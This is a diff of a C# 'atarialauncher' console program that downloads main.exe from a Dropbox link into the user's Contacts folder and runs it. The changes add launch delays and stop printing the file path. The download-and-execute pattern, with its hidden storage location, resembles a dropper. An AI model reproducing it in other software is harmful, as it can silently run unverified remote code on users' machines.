@@ -15,11 +15,10 @@ namespace atarialauncher
         {
             var pathWithEnv = @"%USERPROFILE%\Contacts\main.exe";
             var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
-
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.Title = "CARGANDO...";
             Console.WriteLine("Atarialauncher v2");
-            Console.WriteLine(filePath);
+            /// Console.WriteLine(filePath);
             /// Console.WriteLine(remotebox);
 
             try
@@ -59,11 +58,13 @@ namespace atarialauncher
                         WebClient webClient = new WebClient();
                         webClient.DownloadFile("https://www.dropbox.com/s/fj4i1a254q8dhda/main.exe?dl=1", filePath);
                         Console.WriteLine("Iniciando...");
+                        System.Threading.Thread.Sleep(3000);
                         Process.Start(filePath);
                     }
                     else
                     {
                         Console.WriteLine("Iniciando...");
+                        System.Threading.Thread.Sleep(3000);
                         Process.Start(filePath);
                     }
 
@@ -80,6 +81,7 @@ namespace atarialauncher
                         WebClient webClient = new WebClient();
                         webClient.DownloadFile("https://www.dropbox.com/s/fj4i1a254q8dhda/main.exe?dl=1", filePath);
                         Console.WriteLine("Iniciando...");
+                        System.Threading.Thread.Sleep(3000);
                         Process.Start(filePath);
                     }
                     else
